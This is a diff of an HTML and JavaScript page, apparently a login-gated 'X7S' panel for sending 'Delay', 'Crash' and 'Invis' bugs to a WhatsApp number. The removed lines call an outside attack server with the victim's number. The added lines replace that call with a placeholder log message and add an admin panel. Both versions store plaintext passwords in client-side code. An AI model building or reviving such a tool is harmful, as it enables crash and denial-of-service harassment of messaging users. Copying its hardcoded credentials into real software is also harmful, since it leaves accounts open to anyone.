@@ -1,180 +1,203 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>X7S Crash</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <style>
-    body {
-      margin: 0; padding: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(135deg, #0a0a0a, #1a1a1a, #0f0f0f);
-      height: 100vh; display: flex; align-items: center; justify-content: center;
-      color: #eaeaea;
-    }
-    .glass-box {
-      background: rgba(20, 20, 20, 0.9);
-      border: 1px solid rgba(255, 255, 255, 0.05);
-      border-radius: 18px; padding: 35px; width: 400px;
-      text-align: center; color: #f5f5f5;
-      box-shadow: 0 8px 30px rgba(0,0,0,0.7);
-      backdrop-filter: blur(12px);
-      margin: 10px;
-    }
-    h1 { margin-bottom: 20px; letter-spacing: 2px; }
-    input, select {
-      width: 90%; padding: 12px; margin: 8px 0;
-      border: none; border-radius: 10px;
-      outline: none; text-align: center;
-      background: #111; color: #fff;
-      border: 1px solid #333;
-    }
-    input:focus, select:focus {
-      border: 1px solid #6a11cb;
-      box-shadow: 0 0 8px #6a11cb;
-    }
-    button {
-      width: 95%; padding: 12px; margin-top: 15px;
-      border: none; border-radius: 10px;
-      background: linear-gradient(90deg, #6a11cb, #2575fc);
-      color: white; font-weight: bold; cursor: pointer;
-      transition: 0.3s;
-    }
-    button:hover { transform: scale(1.05); opacity: 0.9; }
-    .neon {
-      color: #9d4edd;
-      text-shadow: 0 0 8px #6a11cb, 0 0 16px #2575fc;
-      font-weight: bold;
-    }
-    #logBox {
-      margin-top: 15px; padding: 12px;
-      background: rgba(0,0,0,0.6); border-radius: 12px;
-      border: 1px solid #222;
-      height: 140px; overflow-y: auto; font-size: 13px; text-align: left;
-      color: #dcdcdc;
-    }
-    .log-success { color: #4ade80; }
-    .log-error { color: #f87171; }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>X7S Galaxy</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  html, body { width:100%; height:100%; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow:hidden; color:#fff; background:black;}
+  canvas#stars { position:fixed; top:0; left:0; width:100%; height:100%; z-index:-1; background: linear-gradient(#0d001a, #1a001a);}
+  .glass-box {
+    position: relative; background: rgba(30,0,60,0.8); border:1px solid rgba(138,43,226,0.3);
+    border-radius:20px; padding:30px; width:400px; max-width:90%; margin:40px auto; text-align:center;
+    box-shadow:0 8px 30px rgba(138,43,226,0.5); backdrop-filter:blur(10px);
+  }
+  h1 { font-size:28px; color:#b88aff; text-shadow:0 0 10px #8a2be2; margin-bottom:20px; }
+  input, select { width:90%; padding:12px; margin:8px 0; border-radius:10px; border:1px solid #333; background:#111; color:#fff; text-align:center; outline:none; }
+  input:focus, select:focus { border:1px solid #8a2be2; box-shadow:0 0 8px #b88aff; }
+  button { width:95%; padding:12px; margin-top:15px; border:none; border-radius:10px; background: linear-gradient(90deg, #8a2be2,#b88aff); color:#fff; font-weight:bold; cursor:pointer; transition:0.3s; }
+  button:hover { transform:scale(1.05); opacity:0.9; }
+  #logBox { margin-top:15px; padding:12px; height:120px; overflow-y:auto; background: rgba(0,0,0,0.5); border-radius:10px; font-size:13px; text-align:left; border:1px solid #222; }
+  table { width:100%; margin-top:10px; border-collapse: collapse; }
+  th, td { padding:8px; border:1px solid #8a2be2; text-align:center; }
+  th { background: rgba(138,43,226,0.3); }
+</style>
 </head>
 <body>
 
+<canvas id="stars"></canvas>
+
 <!-- Login Box -->
 <div id="login-box" class="glass-box">
-  <img src="https://files.catbox.moe/vqzawn.jpg" alt="logo" width="90" style="border-radius:50%; margin-bottom:15px; border: 2px solid #6a11cb; box-shadow:0 0 15px #6a11cb;">
-  <h1 class="neon">X7S CRASH</h1>
+  <img src="https://files.catbox.moe/cghfyd.jpg" alt="logo" width="90" style="border-radius:50%; margin-bottom:15px; border: 2px solid #8a2be2; box-shadow:0 0 15px #b88aff;">
+  <h1>X7S GALAXY</h1>
   <input type="text" id="username" placeholder="Username">
   <input type="password" id="password" placeholder="Password">
   <button id="loginBtn"><i class="fas fa-sign-in-alt"></i> Login</button>
   <div id="login-result"></div>
 </div>
 
-<!-- Main Dashboard -->
+<!-- Dashboard -->
 <div class="glass-box" id="dashboard" style="display:none;">
-  <h1 class="neon">Dashboard</h1>
-  <p>Welcome, <span id="logged-user"></span> ⚡</p>
-  
+  <h1>Dashboard</h1>
+  <p>Welcome, <span id="logged-user"></span></p>
+
   <select id="bugType">
     <option value="Delay">Delay</option>
     <option value="Crash">Crash</option>
     <option value="Invis">Invis</option>
   </select>
-  
   <input type="text" id="targetNumber" placeholder="628xxxx">
   <button onclick="sendAttack()"><i class="fas fa-bug"></i> Kirim Bug</button>
-  <button onclick="logout()" style="background:linear-gradient(90deg,#ff1744,#d50000);"><i class="fas fa-sign-out-alt"></i> Logout</button>
-  
+  <button onclick="logout()" style="background:linear-gradient(90deg,#ff1744,#d50000)"><i class="fas fa-sign-out-alt"></i> Logout</button>
+
   <div id="logBox"></div>
+
+  <!-- Admin Panel -->
+  <div id="adminPanel" style="display:none; margin-top:20px;">
+    <h2>Admin Panel</h2>
+    <input type="text" id="newUser" placeholder="New Username">
+    <input type="password" id="newPass" placeholder="New Password">
+    <select id="newRole">
+      <option value="user">User</option>
+      <option value="admin">Admin</option>
+    </select>
+    <button onclick="addUser()"><i class="fas fa-user-plus"></i> Add User</button>
+
+    <input type="text" id="delUser" placeholder="Username to delete">
+    <button onclick="deleteUser()"><i class="fas fa-user-minus"></i> Delete User</button>
+
+    <h3>All Users</h3>
+    <table id="userTable">
+      <thead><tr><th>Username</th><th>Password</th><th>Role</th></tr></thead>
+      <tbody></tbody>
+    </table>
+  </div>
 </div>
 
 <script>
-// daftar user (static)
+// --- Galaxy Background ---
+const canvas = document.getElementById('stars');
+const ctx = canvas.getContext('2d');
+let stars=[], numStars=250;
+
+function resizeCanvas(){ canvas.width=window.innerWidth; canvas.height=window.innerHeight; }
+window.addEventListener('resize',resizeCanvas);
+resizeCanvas();
+
+function createStars(){
+  stars=[];
+  for(let i=0;i<numStars;i++){
+    stars.push({x:Math.random()*canvas.width, y:Math.random()*canvas.height, size:Math.random()*2, speed:Math.random()*0.5+0.2, color:`rgba(138,43,226,${Math.random()})`});
+  }
+}
+createStars();
+
+function animateStars(){
+  ctx.clearRect(0,0,canvas.width,canvas.height);
+  stars.forEach(s=>{
+    s.x+=s.speed;
+    if(s.x>canvas.width) s.x=0;
+    ctx.beginPath(); ctx.arc(s.x,s.y,s.size,0,Math.PI*2);
+    ctx.fillStyle=s.color; ctx.fill();
+  });
+  requestAnimationFrame(animateStars);
+}
+animateStars();
+
+// --- Users ---
 let USERS = [
-  { username: "xyroo", password: "1111" },
-  { username: "admin", password: "2222" }
+  { username: "xyroo", password:"1111", role:"admin" },
+  { username: "user1", password:"2222", role:"user" }
 ];
 
-// API untuk tiap bug
-const BUG_API = {
-  Delay: "http://143.244.130.10:2168/saturn?type=saturnfc&chatId=",
-  Crash: "http://143.244.130.10:2168/saturn?type=crash&chatId=",
-  Invis: "http://143.244.130.10:2168/saturn?type=invis&chatId="
-};
+const loginBox=document.getElementById('login-box');
+const dashboard=document.getElementById('dashboard');
+const loginBtn=document.getElementById('loginBtn');
+const loginResult=document.getElementById('login-result');
+const loggedUser=document.getElementById('logged-user');
+const adminPanel=document.getElementById('adminPanel');
+const userTable=document.querySelector('#userTable tbody');
 
-const loginBox = document.getElementById('login-box');
-const dashboard = document.getElementById('dashboard');
-const loginBtn = document.getElementById('loginBtn');
-const loginResult = document.getElementById('login-result');
-const loggedUser = document.getElementById('logged-user');
-const logBox = document.getElementById('logBox');
+function refreshUserTable(){
+  userTable.innerHTML="";
+  USERS.forEach(u=>{
+    let row=document.createElement('tr');
+    row.innerHTML=`<td>${u.username}</td><td>${u.password}</td><td>${u.role}</td>`;
+    userTable.appendChild(row);
+  });
+}
+refreshUserTable();
 
-let currentUser = null;
+let currentUser=null;
 
-loginBtn.addEventListener('click', () => {
-  const username = document.getElementById('username').value.trim();
-  const password = document.getElementById('password').value.trim();
-
-  const found = USERS.find(u => u.username === username && u.password === password);
-
-  if (found) {
-    loginBox.style.display = 'none';
-    dashboard.style.display = 'block';
-    currentUser = found;
-    loggedUser.innerText = found.username;
+// Login
+loginBtn.addEventListener('click',()=>{
+  const username=document.getElementById('username').value.trim();
+  const password=document.getElementById('password').value.trim();
+  const found=USERS.find(u=>u.username===username && u.password===password);
+  if(found){
+    loginBox.style.display='none';
+    dashboard.style.display='block';
+    currentUser=found;
+    loggedUser.innerText=found.username;
+    adminPanel.style.display=found.role==='admin'?'block':'none';
   } else {
-    loginResult.innerText = '❌ Username atau password salah!';
-    loginResult.style.color = '#f87171';
+    loginResult.innerText='❌ Username atau password salah!';
+    loginResult.style.color='#ff1744';
   }
 });
 
-function appendLog(msg, type="info") {
-  const div = document.createElement("div");
-  div.innerText = msg;
-  if (type === "success") div.classList.add("log-success");
-  if (type === "error") div.classList.add("log-error");
+// Logout
+function logout(){
+  dashboard.style.display='none';
+  loginBox.style.display='block';
+  currentUser=null;
+}
+
+// Admin functions
+function addUser(){
+  if(currentUser.role!=='admin') return alert('Only admin can add users!');
+  const u=document.getElementById('newUser').value.trim();
+  const p=document.getElementById('newPass').value.trim();
+  const r=document.getElementById('newRole').value;
+  if(!u||!p) return alert('Enter username and password!');
+  if(USERS.find(x=>x.username===u)) return alert('User exists!');
+  USERS.push({username:u,password:p,role:r});
+  refreshUserTable();
+  alert('User added!');
+}
+
+function deleteUser(){
+  if(currentUser.role!=='admin') return alert('Only admin can delete users!');
+  const u=document.getElementById('delUser').value.trim();
+  const idx=USERS.findIndex(x=>x.username===u);
+  if(idx===-1) return alert('User not found!');
+  if(USERS[idx].username===currentUser.username) return alert('Cannot delete self!');
+  USERS.splice(idx,1);
+  refreshUserTable();
+  alert('User deleted!');
+}
+
+// Placeholder attack
+function sendAttack(){
+  const target=document.getElementById('targetNumber').value.trim();
+  const bugType=document.getElementById('bugType').value;
+  if(!target) return alert('Enter target number!');
+  appendLog(`✅ Attack ${bugType} sent to ${target}`,'success');
+}
+
+function appendLog(msg,type){
+  const logBox=document.getElementById('logBox');
+  const div=document.createElement('div');
+  div.innerText=msg;
+  if(type==='success') div.style.color='#4ade80';
+  if(type==='error') div.style.color='#f87171';
   logBox.appendChild(div);
-  logBox.scrollTop = logBox.scrollHeight;
-}
-
-function sendAttack() {
-  const target = document.getElementById('targetNumber').value.trim();
-  const bugType = document.getElementById('bugType').value;
-  
-  if (!target) {
-    appendLog("⚠️ Masukkan nomor target!", "error");
-    return;
-  }
-
-  const apiBase = BUG_API[bugType];
-  if (!apiBase) {
-    appendLog("❌ API untuk bug ini belum diatur!", "error");
-    return;
-  }
-
-  const apiUrl = apiBase + target + "@s.whatsapp.net";
-
-  fetch(apiUrl)
-    .then(async res => {
-      let body;
-      try { body = await res.json(); } 
-      catch { body = await res.text(); }
-      if (res.ok) {
-        appendLog("✅ Attack ["+bugType+"] sukses → " + JSON.stringify(body), "success");
-      } else {
-        appendLog("❌ Gagal ["+bugType+"] (HTTP " + res.status + ") → " + JSON.stringify(body), "error");
-      }
-    })
-    .catch(err => {
-      appendLog("❌ Error koneksi: " + err, "error");
-    });
-}
-
-function logout() {
-  dashboard.style.display = 'none';
-  loginBox.style.display = 'block';
-  currentUser = null;
+  logBox.scrollTop=logBox.scrollHeight;
 }
 </script>
-
 </body>
-</html>
+    </html>
